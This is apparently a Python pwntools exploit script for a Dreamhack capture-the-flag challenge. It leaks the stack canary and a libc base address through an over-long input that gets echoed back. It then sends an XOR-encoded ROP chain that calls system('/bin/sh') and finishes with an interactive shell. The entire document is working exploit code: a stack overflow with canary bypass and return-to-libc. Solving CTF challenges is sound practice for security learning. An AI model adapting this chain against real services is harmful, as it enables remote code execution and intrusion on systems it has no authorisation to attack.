#!/usr/bin/env python3
from pwn import *

PORT = 12972
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./prob_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x00000000000012BB
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)


pl = b'ABCDEFGHIJKLMNOPQRSTUVWXY'
sa(b'Input: ', pl)
p.recvuntil(b'You entered: ')
raw = p.recvline().strip()
canary = u64(b'\x00' + raw[-8:-1])
log.info(f'canary: {hex(canary)}')

pl = b'ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMN'

sa(b'Input: ', pl)
p.recvuntil(b'You entered: ')
raw = p.recvline()
libc.address = u64(raw[-7:-1] + b'\x00\x00') - 0x29d90
log.info(f'libc: {hex(libc.address)}')

pl = b'ABCDEFGHIJKLMNOPQRSTUVWX'

def generate_xor_payload(target_rop_chain: bytes) -> bytes:
    n = len(target_rop_chain)
    payload = bytearray(n)

    payload[n - 1] = target_rop_chain[n - 1]
    
    for i in range(n - 2, -1, -1):
        payload[i] = target_rop_chain[i] ^ payload[i + 1]
        
    return bytes(payload)

rop = flat(
	pl,
	canary,
	b'ABCDEFGH',
	libc.address + 0x000000000002a3e5 + 1,
	libc.address + 0x000000000002a3e5,
	next(libc.search(b'/bin/sh\0')),
	libc.sym.system
	)

sa(b'Input: ', generate_xor_payload(rop))

# GDB()
sa(b'Input: ', generate_xor_payload(b'exit\0'))

p.interactive()